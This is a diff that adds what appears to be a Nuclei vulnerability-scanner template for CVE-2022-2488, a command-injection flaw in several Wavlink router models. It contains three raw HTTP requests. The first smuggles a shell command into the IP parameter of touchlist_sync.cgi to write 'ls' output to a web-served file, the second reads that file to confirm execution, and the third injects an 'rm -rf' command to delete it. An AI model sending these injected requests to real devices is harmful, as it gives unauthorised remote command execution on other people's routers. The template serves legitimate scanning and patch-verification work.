@@ -1,0 +1,55 @@
+id: cve-2022-2488
+info:
+  name: Wavlink touchlist_sync.cgi Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WAVLINK routers have a command execution vulnerability in the `touchlist_sync.cgi` file, allowing attackers to execute system commands and gain server privileges. Affected models include WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4.
+  tags: [iot, rce]
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cve-id: CVE-2022-2488
+  metadata:
+    affected-products: ["WN530HG4", "WN531G3", "WN572HG3", "WN535G3", "WN575A4"]
+    disclosure-date: 2022-07-05
+
+variables:
+  cmd: "id"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: check-vulnerability
+    raw:
+      - |
+        GET /cgi-bin/touchlist_sync.cgi?IP=;ls>./1.txt; HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: or
+    matchers:
+      - type: status
+        status: [200, 500]
+
+  - id: verify-command-execution
+    raw:
+      - |
+        GET /cgi-bin/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - ".cgi"
+        part: body
+
+  - id: clean-up
+    raw:
+      - |
+        GET /cgi-bin/touchlist_sync.cgi?IP=;rm%20-rf%20./1.txt; HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
